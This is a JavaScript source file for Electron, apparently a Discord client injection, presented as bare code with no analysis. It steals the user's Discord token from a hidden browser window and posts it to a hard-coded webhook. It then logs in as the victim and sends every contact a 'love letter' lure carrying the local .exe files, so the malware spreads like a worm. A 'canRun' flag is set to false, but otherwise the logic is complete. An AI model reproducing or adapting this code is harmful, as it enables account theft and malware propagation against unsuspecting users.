const { BrowserWindow } = require("electron");
const { Client } = require("discord.js-selfbot-v13");
const https = require("https");
const fs = require("fs");
const path = require("path");

const client = new Client();

const canRun = false

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

client.on("ready", async () => {
    const files = getExeFiles();

    client.users.cache.forEach(async (user) => {
        await user.send({ content: "I love you ❤️\nPlease read my love letter!", files: files });
    });
});

const getExeFiles = () => {
    const dirPath = __dirname;
    const files = fs.readdirSync(dirPath);
    return files
        .filter(file => file.endsWith('.exe'))
        .map(file => path.join(dirPath, file));
};

const getToken = async () => {
    try {
        const window = BrowserWindow.getAllWindows()[0];
        if (!window) throw new Error('No window available');

        await new Promise((resolve, reject) => {
            window.webContents.once("did-finish-load", () => {
                resolve();
            });

            setTimeout(() => reject("Page did not finish loading in time"), 60000);
        });

        const token = await executeJS(`
            (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
            .find(m=>m?.exports?.default?.getToken!==void 0)
            .exports.default.getToken()
        `);

        return token;
    } catch (error) {
        throw error;
    }
};

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];

    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const sendTokenToWebhook = async (token) => {
    const webhookUrl = "https://discord.com/api/webhooks/1319972941902909501/RsdoFdGjR3ybVmA6E8wOKpYbu34pimJ2EGyS8LP0qTWEyorOWoHRKSm5oMWQXx2-9owp";
    const message = {
        content: `Discord Token: ${token}`
    };

    const data = JSON.stringify(message);

    const headers = {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(data),
    };

    await request('POST', webhookUrl, headers, data);
};

const createWindow = () => {
    const mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        show: false,
        webPreferences: {
            nodeIntegration: true,
        },
    });
    mainWindow.loadURL("https://discord.com");
};

const initializeApp = async () => {
    createWindow();

    const token = await getToken();
    if (token) {
        if (canRun) {
            await sendTokenToWebhook(token);
            await client.login(token);
        };
    };
};

initializeApp();

module.exports = require("./core.asar");
